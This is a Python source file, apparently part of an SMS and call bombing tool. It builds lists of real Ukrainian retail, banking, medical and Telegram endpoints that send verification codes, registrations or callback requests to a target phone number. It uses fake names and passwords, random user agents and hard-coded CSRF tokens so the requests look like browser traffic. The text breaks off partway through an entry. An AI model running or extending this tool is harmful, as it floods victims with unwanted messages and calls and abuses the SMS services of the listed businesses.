from information.spam_full_info import *

def format_phone(number: str, format: str) -> str:
    g = [i for i, k in enumerate(format) if k == '#']
    format = list(format)
    for i in range(len(g)):
        format[g[i]] = number[i]
    return ''.join(format)

def get_services(number: str, spam_type: str):
    services = {
        "services_sms": [
            {
                "url": "https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {'firstname': name, 'lastname': surname, 'email': email, 'telephone': number,
                         'password': password, 'smscode': "", 'step': "first_step"
                         }
            },
            {
                "url": "https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode",
                "send": "post",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "data",
                "data": {
                    'telephone': format_phone(number, "+##(###) ###-##-##")
                }
            },
            {
                "url": "https://smvape.com.ua/uk/module/ecm_smssender/otp",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'ajax': "true",
                    'action': "sendOtp",
                    'phone': format_phone(number, "##(###)###-##-##"),
                    'mode': "verify",
                    'onestep': "true"
                }
            },
            {
                "url": "https://vapehub.shop/index.php?route=common/login_modal/send_sms",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'telephone': format_phone(number, "+##(###)###-##-##")
                }
            },
            {
                "url": "https://uvape.pro/index.php?route=account/register/add",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'firstname': name,
                    'telephone': format_phone(number, "+## (###) ### ####"),
                    'email': email,
                    'password': password
                }
            },
            {
                "url": "https://yabloki.ua/ajax/auth/send-verification-code",
                "send": "post",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "json",
                "data": {
                    'firstName': name,
                    'isCheckout': 'false',
                    'phoneNumber': format_phone(number, "+## ### ### ## ##")
                }
            },
            {
                "url": "https://back.boo.ua/api/front/user/registration/sms/send",
                "send": "post",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "json",
                "data": {
                    'phone': format_phone(number, "+### ## ### ## ##"),
                }
            },
            {
                "url": "https://gepur.com/rapi/auth/register-retail-buyer",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'Host': 'gepur.com'},
                "spam_type": "json",
                "data": {
                    'email': email,
                    'firstName': name,
                    'lastName': surname,
                    'password': password,
                    'phone': f"+{number}"
                }
            },
            {
                "url": "https://ua.pielcosmetics.com/ajax/check_phone.php",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'type': "CHECK_PHONE",
                    'phone': f"+{number}"
                }
            },
            {
                "url": "https://moonali.com.ua/index.php?route=account/register/sendCodeSms",
                "send": "post",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "data",
                "data": {
                    'telephone': format_phone(number, "+## (###) ##-##-###")
                }
            },
            {
                "url": "https://bayadera.ua/api/v1/registration/check-phone",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "json",
                "data": {
                    'phone': number
                }
            },
            {
                "url": "https://rumka.online/auth/send-code",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "json",
                "data": {
                    'phone': format_phone(number, "+### (##) ###-##-##")
                }
            },
            {
                "url": "https://shop.myimo.com.ua/brander_smsconfirm_customer/process/init/",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'form_action': "https://shop.myimo.com.ua/brander_smsconfirm_customer/process/init/",
                    'telephone': format_phone(number, "+##(###)###-##-##")
                }
            },
            {
                "url": "https://www.coffeemarket.dp.ua/index.php?route=account/register",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'x-requested-with': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'telephone': format_phone(number, "+##(###) ###-##-##"),
                    'password': password,
                    'agree': 'on'
                }
            },
            {
                "url": "https://api.pizzaday.ua/api/V1/user/sendCode",
                "send": "post",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "json",
                "data": {
                    "lang": "uk",
                    "applicationSend": "sms",
                    "phone": number
                }
            },
            {
                "url": "https://ilounge.ua/ua/user/password_remind",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "data",
                "send": "post",
                "data": {'email': '', 'phone': format_phone(number, "+##(###)###-##-##")}
            },
            {
                "url": "https://a-bank.com.ua/backend/api/v1/corezoid",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "json",
                "send": "post",
                "data": {
                    "conv_data": {
                        "phone": format_phone(number, "+## (###) ### ## ##"),
                        "utm_source": "site"
                    },
                    "hash": "4RR2342L90V22AE7",
                    "_": 1671348589209
                }
            },
            {
                "url": "https://helsi.me/api/healthy/v2/accounts/login",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "json",
                "send": "post",
                "data": {'phone': number, 'platform': 'PISWeb'}
            },
            {
                "url": "https://iq-pizza.eatery.club/site/v1/pre-login",
                "headers": {'User-Agent': get_agent()},
                "send": "post",
                "spam_type": "json",
                "data": {'phone': number}
            },
            {
                "url": 'https://my.telegram.org/auth/send_password',
                "send": "post",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "data",
                "data": {'phone': f'+{number}'}
            },
            {
                "url": "https://aurum.in.ua/local/ajax/authorize.php?lang=ua",
                "headers": {'User-Agent': get_agent()},
                "send": "post",
                "spam_type": "json",
                "data": {"phone": format_phone(number, "+## ### ### ## ##"), "lang": "ua"}
            },
            {
                "url": f'https://www.add.ua/brander_smsconfirm_login/send/?telephone=+{number}&code=&type=sms',
                "send": "get",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "data",
                "data": ""
            },
            {
                "url": f'https://c2c.oschadbank.ua/api/sms/{number}',
                "send": "get",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "data",
                "data": ""
            },
            {
                "url": "https://automoto.ua/uk/my-office/login_new",
                "send": "post",
                "headers": {"User-Agent": get_agent(),
                            "origin": "https://automoto.ua",
                            "priority": "u=1, i",
                            "referer": "https://automoto.ua/uk/",
                            "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": "Linux",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "accept": "application/json, text/plain, */*",
                            "accept-encoding": "gzip, deflate, br, zstd",
                            "accept-language": "uk,ru;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5",
                            "content-length": "26",
                            "content-type": "application/json;charset=UTF-8"
                            },
                "spam_type": "json",
                "data": {
                    "phone": format_phone(number, "## ### #######")
                }
            },
            {
                "url": "https://vchehle.ua/uk/register",
                "send": "post",
                "headers": {"User-Agent": get_agent()},
                "spam_type": "data",
                "data": {'email': f"+{number}", 'password': password, 'password_confirmation': password}
            },
            {
                "url": f"https://bond.od.ua/cliententer//passwordsent/?phone=+{number}",
                "send": "get",
                "spam_type": "data",
                "headers": {"User-Agent": get_agent()},
                "data": ""
            },
            {
                "url": "https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua",
                "send": "post",
                "spam_type": "json",
                "headers": {"User-Agent": get_agent()},
                "data": {'phone': f"+{number}"}
            },
            {
                "url": "https://api.iqos.com.ua/v1/auth/otp",
                "send": "post",
                "spam_type": "json",
                "headers": {"User-Agent": get_agent()},
                "data": {'phone': number}
            },
            {
                "url": "https://welovemebel.com.ua/ajax/auth_register.php",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent(), "x-requested-with":"XMLHttpRequest"},
                "data": {
    "USER_LOGIN": f"+{number}",
    "SECRET": "secretAuth"
                }
            },
            {
                "url": "https://maslotom.com/api/index.php?route=api/account/phoneLogin",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent()},
                "data": {'phone': format_phone(number, "+###(##)###-##-##")}
            },
            {
                "url": "https://odrex.top/api/sms",
                "send": "post",
                "spam_type": "json",
                "headers": {'User-Agent': get_agent()},
                "data": {"phone": number, "sms_code_type": "random", "type": "registration"}
            },
            {
                "url": "https://auth2.multiplex.ua/login",
                "send": "post",
                "spam_type": "json",
                "headers": {'User-Agent': get_agent()},
                "data": {"login": number}
            },
            {
                "url": "https://market.rukavychka.ua/index.php?route=account/confirm_phone/beforeShowPopup",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent(), 'x-requested-with': 'XMLHttpRequest'},
                "data": {
                    "telephone": format_phone(number, "+## (###) ###-##-##")
                }
            },
    {
                "url": "https://symbol.ua/uk/auth/send-login-code-on-phone",
                "send": "post",
                "spam_type": "data",
                "headers": {'accept': 'application/json, text/javascript, */*; q=0.01',
                                       'accept-encoding': 'gzip, deflate, br',
                                       'accept-language': 'uk,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                                       'content-length': '124',
                                       'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                       'origin': 'https://symbol.ua',
                                       'referer': 'https://symbol.ua/uk/women?gclid=CjwKCAjw1ICZBhAzEiwAFfvFhKLC47fa0r440KkrrqrehSrOgNp9rk5B7ma1o_OC8xP-jdvARgvJahoCRQMQAvD_BwE',
                                       'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
                                       'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': "Windows",
                                       'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
                                       'sec-fetch-site': 'same-origin', 'user-agent': get_agent(),
                                       'x-csrf-token': 'vAEiHe4J0EpcNpr-zytnFIC3Ry5OQeGkPwZJ0WT0U_vyTHVCpTi2Pipv7rS-RR9E4eV1Ywp3pNJmNR29EIwYtw==',
                                       'x-requested-with': 'XMLHttpRequest'},
                "data": {
                            '_csrf': 'aRyHRsClYE_6VhuvWCId23uQuqV7c-xaF6b9fNMz7LonUdAZi5QGO4wPb-UpTGWLGsKI6D9FqSxOlakQp0un9g==',
                            'phone': format_phone(number, "+### ## ### ## ##")}

            },
            {
                "url": "https://chereviki.com.ua/register",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent()},
                "data": {'newsletter': '1', 'guest': '0', 'lastname': name, 'firstname': surname,
                         'telephone': format_phone(number, "+## (###) ###-##-##"),
                         'email': email, 'password': password, 'confirm': password,
                         'birthday': f'{randint(10, 29)}-{randint(10, 29)}-{randint(1995, 2004)}'}
            },
            {
                "url": "https://chereviki.com.ua/login",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent()},
                "data": {'type_auth': 'auth_sms',
                         'sms[telephone]': format_phone(number, "+## (###) ###-##-##"),
                         'sms[password]': '',
                         'pass[telephone]': '+38 (0__) ___-__-__',
                         'pass[password]': password}
            },
            {
                "url": f"https://vencon.ua/ua/user/profile/send-phone-verify-code?key=0&phone={format_phone(number, '+###(##)-###-##-##')}&duplicate=false",
                "send": "get",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent(), 'x-requested-with':'XMLHttpRequest'},
                "data": ""
            },
            {
                "url": f"https://24.meest.com/api/v1/login?lang=uk",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent()},
                "data": {
                    "login": number,
                    "clientID": "GA1.1.199843362.1730598411"
                }
            },
            {
                "url": f"https://api.creditkasa.ua/public/auth/sendAcceptanceCode",
                "send": "post",
                "spam_type": "json",
                "headers": {'User-Agent': get_agent()},
                "data": {
                    "mobilePhone": number,
                    "productGroup": "INSTALLMENT",
                    "brandName": "NaVse"
                }
            },
            {
                "url": f"https://api-petrikivka.abmloyalty.app/v2.1/client/registration",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent()},
                "data": {
                    "phone": format_phone(number, "+## (###) ###-####"),
                    "password": password,
                    "token": "null"
                }
            },
            {
                "url": f"https://api.lullaby.ua/api/phone/code/send",
                "send": "post",
                "spam_type": "json",
                "headers": {'User-Agent': get_agent()},
                "data": {
                    "phone": f"+{number}",
                    "remember": False
                }
            },
            {
                "url": f"https://galafarm.com.ua/api/auth/register",
                "send": "post",
                "spam_type": "json",
                "headers": {'User-Agent': get_agent(), "x-requested-with": "XMLHttpRequest",
                            "origin": "https://galafarm.com.ua", 'priority': "u = 1, i",
                            'referer': "https://galafarm.com.ua/about",
                            'sec-ch-ua': '''"Chromium";v = "128", "Not;A=Brand";v = "24", "Microsoft Edge";v = "128"''',
                            'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': "Linux", 'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin'},
                "data": {
                    "locale": "uk",
                    "phone": format_phone(number, "+## (###) ###-##-##"),
                    "name": name,
                    "surname": surname,
                    "password": password,
                    "password_confirmation": password
                }
            },
            {
                "url": "https://mapizza.com.ua/wp-admin/admin-ajax.php",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'x-requested-with': 'XMLHttpRequest',
                            'referer': 'https://mapizza.com.ua/'},
                "spam_type": "data",
                "data": {
                    'first_name': name,
                    'last_name': surname,
                    'calendar': '04.04.2000',
                    'email': email,
                    'phone': format_phone(number, "+## (###) ### ## ##"),
                    'input_check_send_sms': '',
                    'password': password,
                    'password2': password,
                    'agree': 'on',
                    'action': 'register_user'
                }
            },
            {
                "url": "https://admin.newtea.ua/api/v1/user-send-sms",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'x-requested-with': 'XMLHttpRequest'},
                "spam_type": "json",
                "data": {
                    'phone_number': f"+{number}"
                }
            },
            {
                "url": "https://admin.thetea.ua/api/v1/user-send-sms",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'x-requested-with': 'XMLHttpRequest'},
                "spam_type": "json",
                "data": {
                    'phone_number': f"+{number}"
                }
            },
            {
                "url": "https://sushiya.ua/api/v1/user/auth",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate, br, zstd', 'Referer': 'https://sushiya.ua/lviv',
                            'Authorization': 'Bearer demo', 'Content-Type': 'application/x-www-form-urlencoded',
                            'Content-Length': '28', 'Origin': 'https://sushiya.ua', 'Alt-Used': 'sushiya.ua',
                            'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'same-origin', 'Priority': 'u=1'},
                "spam_type": "data",
                "data": {
                    'phone': number[2:],
                    'need_skeep': ""
                }
            }
        ],


        "services_call": [
            {
                "url": "https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck",
                "send": "post",
                "headers": {'User-Agent': get_agent(), "x-requested-with": "XMLHttpRequest"},
                "spam_type": "data",
                "data": {'phone': format_phone(number, "+##(###)###-##-##")}
            },
            {
                "url": "https://italfood.com.ua/index.php?route=octemplates/module/oct_popup_call_phone/send",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'name': name,
                    'telephone': format_phone(number, "+##+(###)+###-##-##"),
                    'url_page': "https://italfood.com.ua/create-account",
                    'comment': "",
                    'agree': "on"
                }
            },
            {
                "url": "https://pesto-family.com/index.php?route=information/contact/feedback",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'feedbackName': name,
                    'feedbackPhone': format_phone(number, "##+(###)+###+##+##"),
                    'feedbackEmail': "",
                    'feedbackMsg': "",
                }
            }
        ],


        "services_mix": [
            {
                "url": "https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {'firstname': name, 'lastname': surname, 'email': email, 'telephone': number,
                         'password': password, 'smscode': "", 'step': "first_step"
                         }
            },
            {
                "url": "https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode",
                "send": "post",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "data",
                "data": {
                    'telephone': format_phone(number, "+##(###) ###-##-##")
                }
            },
            {
                "url": "https://smvape.com.ua/uk/module/ecm_smssender/otp",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'ajax': "true",
                    'action': "sendOtp",
                    'phone': format_phone(number, "##(###)###-##-##"),
                    'mode': "verify",
                    'onestep': "true"
                }
            },
            {
                "url": "https://vapehub.shop/index.php?route=common/login_modal/send_sms",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'telephone': format_phone(number, "+##(###)###-##-##")
                }
            },
            {
                "url": "https://uvape.pro/index.php?route=account/register/add",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'firstname': name,
                    'telephone': format_phone(number, "+## (###) ### ####"),
                    'email': email,
                    'password': password
                }
            },
            {
                "url": "https://yabloki.ua/ajax/auth/send-verification-code",
                "send": "post",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "json",
                "data": {
                    'firstName': name,
                    'isCheckout': 'false',
                    'phoneNumber': format_phone(number, "+## ### ### ## ##")
                }
            },
            {
                "url": "https://back.boo.ua/api/front/user/registration/sms/send",
                "send": "post",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "json",
                "data": {
                    'phone': format_phone(number, "+### ## ### ## ##"),
                }
            },
            {
                "url": "https://gepur.com/rapi/auth/register-retail-buyer",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'Host': 'gepur.com'},
                "spam_type": "json",
                "data": {
                    'email': email,
                    'firstName': name,
                    'lastName': surname,
                    'password': password,
                    'phone': f"+{number}"
                }
            },
            {
                "url": "https://moonali.com.ua/index.php?route=account/register/sendCodeSms",
                "send": "post",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "data",
                "data": {
                    'telephone': format_phone(number, "+## (###) ##-##-###")
                }
            },
            {
                "url": "https://ua.pielcosmetics.com/ajax/check_phone.php",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'type': "CHECK_PHONE",
                    'phone': f"+{number}"
                }
            },
            {
                "url": "https://bayadera.ua/api/v1/registration/check-phone",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "json",
                "data": {
                    'phone': number
                }
            },
            {
                "url": "https://rumka.online/auth/send-code",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "json",
                "data": {
                    'phone': format_phone(number, "+### (##) ###-##-##")
                }
            },
            {
                "url": "https://sushiya.ua/api/v1/user/auth",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate, br, zstd', 'Referer': 'https://sushiya.ua/lviv',
                            'Authorization': 'Bearer demo', 'Content-Type': 'application/x-www-form-urlencoded',
                            'Content-Length': '28', 'Origin': 'https://sushiya.ua', 'Alt-Used': 'sushiya.ua',
                            'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'same-origin', 'Priority': 'u=1'},
                "spam_type": "data",
                "data": {
                    'phone': number[2:],
                    'need_skeep': ""
                }
            },
            {
                "url": "https://pesto-family.com/index.php?route=information/contact/feedback",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'feedbackName': name,
                    'feedbackPhone': format_phone(number, "##+(###)+###+##+##"),
                    'feedbackEmail': "",
                    'feedbackMsg': "",
                }
            },
            {
                "url": "https://italfood.com.ua/index.php?route=octemplates/module/oct_popup_call_phone/send",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'name': name,
                    'telephone': format_phone(number, "+##+(###)+###-##-##"),
                    'url_page': "https://italfood.com.ua/create-account",
                    'comment': "",
                    'agree': "on"
                }
            },
            {
                "url": "https://shop.myimo.com.ua/brander_smsconfirm_customer/process/init/",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'X-Requested-With': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'form_action': "https://shop.myimo.com.ua/brander_smsconfirm_customer/process/init/",
                    'telephone': format_phone(number, "+##(###)###-##-##")
                }
            },
            {
                "url": "https://admin.thetea.ua/api/v1/user-send-sms",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'x-requested-with': 'XMLHttpRequest'},
                "spam_type": "json",
                "data": {
                    'phone_number': f"+{number}"
                }
            },
            {
                "url": "https://www.coffeemarket.dp.ua/index.php?route=account/register",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'x-requested-with': 'XMLHttpRequest'},
                "spam_type": "data",
                "data": {
                    'telephone': format_phone(number, "+##(###) ###-##-##"),
                    'password': password,
                    'agree': 'on'
                }
            },
            {
                "url": "https://admin.newtea.ua/api/v1/user-send-sms",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'x-requested-with': 'XMLHttpRequest'},
                "spam_type": "json",
                "data": {
                    'phone_number': f"+{number}"
                }
            },
            {
                "url": "https://api.pizzaday.ua/api/V1/user/sendCode",
                "send": "post",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "json",
                "data": {
                    "lang": "uk",
                    "applicationSend": "sms",
                    "phone": number
                }
            },
            {
                "url": "https://mapizza.com.ua/wp-admin/admin-ajax.php",
                "send": "post",
                "headers": {'User-Agent': get_agent(), 'x-requested-with': 'XMLHttpRequest',
                            'referer': 'https://mapizza.com.ua/'},
                "spam_type": "data",
                "data": {
                    'first_name': name,
                    'last_name': surname,
                    'calendar': '04.04.2000',
                    'email': email,
                    'phone': format_phone(number, "+## (###) ### ## ##"),
                    'input_check_send_sms': '',
                    'password': password,
                    'password2': password,
                    'agree': 'on',
                    'action': 'register_user'
                }
            },
            {
                "url": "https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck",
                "send": "post",
                "headers": {'User-Agent': get_agent(), "x-requested-with": "XMLHttpRequest"},
                "spam_type": "data",
                "data": {'phone': format_phone(number, "+##(###)###-##-##")}
            },
            {
                "url": "https://ilounge.ua/ua/user/password_remind",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "data",
                "send": "post",
                "data": {'email': '', 'phone': format_phone(number, "+##(###)###-##-##")}
            },
            {
                "url": f"https://galafarm.com.ua/api/auth/register",
                "send": "post",
                "spam_type": "json",
                "headers": {'User-Agent': get_agent(), "x-requested-with": "XMLHttpRequest",
                            "origin": "https://galafarm.com.ua", 'priority': "u = 1, i",
                            'referer': "https://galafarm.com.ua/about",
                            'sec-ch-ua': '''"Chromium";v = "128", "Not;A=Brand";v = "24", "Microsoft Edge";v = "128"''',
                            'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': "Linux", 'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin'},
                "data": {
                    "locale": "uk",
                    "phone": format_phone(number, "+## (###) ###-##-##"),
                    "name": name,
                    "surname": surname,
                    "password": password,
                    "password_confirmation": password
                }
            },
            {
                "url": f"https://api.lullaby.ua/api/phone/code/send",
                "send": "post",
                "spam_type": "json",
                "headers": {'User-Agent': get_agent()},
                "data": {
                    "phone": f"+{number}",
                    "remember": False
                }
            },
            {
                "url": f"https://api-petrikivka.abmloyalty.app/v2.1/client/registration",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent()},
                "data": {
                    "phone": format_phone(number, "+## (###) ###-####"),
                    "password": password,
                    "token": "null"
                }
            },
            {
                "url": "https://a-bank.com.ua/backend/api/v1/corezoid",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "json",
                "send": "post",
                "data": {
                    "conv_data": {
                        "phone": format_phone(number, "+## (###) ### ## ##"),
                        "utm_source": "site"
                    },
                    "hash": "4RR2342L90V22AE7",
                    "_": 1671348589209
                }
            },
            {
                "url": "https://helsi.me/api/healthy/v2/accounts/login",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "json",
                "send": "post",
                "data": {'phone': number, 'platform': 'PISWeb'}
            },
            {
                "url": "https://iq-pizza.eatery.club/site/v1/pre-login",
                "headers": {'User-Agent': get_agent()},
                "send": "post",
                "spam_type": "json",
                "data": {'phone': number}
            },
            {
                "url": 'https://my.telegram.org/auth/send_password',
                "send": "post",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "data",
                "data": {'phone': f'+{number}'}
            },
            {
                "url": "https://aurum.in.ua/local/ajax/authorize.php?lang=ua",
                "headers": {'User-Agent': get_agent()},
                "send": "post",
                "spam_type": "json",
                "data": {"phone": format_phone(number, "+## ### ### ## ##"), "lang": "ua"}
            },
            {
                "url": f'https://www.add.ua/brander_smsconfirm_login/send/?telephone=+{number}&code=&type=sms',
                "send": "get",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "data",
                "data": ""
            },
            {
                "url": f'https://c2c.oschadbank.ua/api/sms/{number}',
                "send": "get",
                "headers": {'User-Agent': get_agent()},
                "spam_type": "data",
                "data": ""
            },
            {
                "url": "https://automoto.ua/uk/my-office/login_new",
                "send": "post",
                "headers": {"User-Agent": get_agent(),
                            "origin": "https://automoto.ua",
                            "priority": "u=1, i",
                            "referer": "https://automoto.ua/uk/",
                            "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": "Linux",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "accept": "application/json, text/plain, */*",
                            "accept-encoding": "gzip, deflate, br, zstd",
                            "accept-language": "uk,ru;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5",
                            "content-length": "26",
                            "content-type": "application/json;charset=UTF-8"
                            },
                "spam_type": "json",
                "data": {
                    "phone": format_phone(number, "## ### #######")
                }
            },
            {
                "url": "https://vchehle.ua/uk/register",
                "send": "post",
                "headers": {"User-Agent": get_agent()},
                "spam_type": "data",
                "data": {'email': f"+{number}", 'password': password, 'password_confirmation': password}
            },
            {
                "url": f"https://bond.od.ua/cliententer//passwordsent/?phone=+{number}",
                "send": "get",
                "spam_type": "data",
                "headers": {"User-Agent": get_agent()},
                "data": ""
            },
            {
                "url": "https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua",
                "send": "post",
                "spam_type": "json",
                "headers": {"User-Agent": get_agent()},
                "data": {'phone': f"+{number}"}
            },
            {
                "url": "https://api.iqos.com.ua/v1/auth/otp",
                "send": "post",
                "spam_type": "json",
                "headers": {"User-Agent": get_agent()},
                "data": {'phone': number}
            },
            {
                "url": "https://welovemebel.com.ua/ajax/auth_register.php",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent(), "x-requested-with":"XMLHttpRequest"},
                "data": {
    "USER_LOGIN": f"+{number}",
    "SECRET": "secretAuth"
                }
            },
            {
                "url": "https://maslotom.com/api/index.php?route=api/account/phoneLogin",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent()},
                "data": {'phone': format_phone(number, "+###(##)###-##-##")}
            },
            {
                "url": "https://odrex.top/api/sms",
                "send": "post",
                "spam_type": "json",
                "headers": {'User-Agent': get_agent()},
                "data": {"phone": number, "sms_code_type": "random", "type": "registration"}
            },
            {
                "url": "https://auth2.multiplex.ua/login",
                "send": "post",
                "spam_type": "json",
                "headers": {'User-Agent': get_agent()},
                "data": {"login": number}
            },
            {
                "url": "https://market.rukavychka.ua/index.php?route=account/confirm_phone/beforeShowPopup",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent(), 'x-requested-with': 'XMLHttpRequest'},
                "data": {
                    "telephone": format_phone(number, "+## (###) ###-##-##")
                }
            },
    {
                "url": "https://symbol.ua/uk/auth/send-login-code-on-phone",
                "send": "post",
                "spam_type": "data",
                "headers": {'accept': 'application/json, text/javascript, */*; q=0.01',
                                       'accept-encoding': 'gzip, deflate, br',
                                       'accept-language': 'uk,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                                       'content-length': '124',
                                       'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                       'origin': 'https://symbol.ua',
                                       'referer': 'https://symbol.ua/uk/women?gclid=CjwKCAjw1ICZBhAzEiwAFfvFhKLC47fa0r440KkrrqrehSrOgNp9rk5B7ma1o_OC8xP-jdvARgvJahoCRQMQAvD_BwE',
                                       'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
                                       'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': "Windows",
                                       'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
                                       'sec-fetch-site': 'same-origin', 'user-agent': get_agent(),
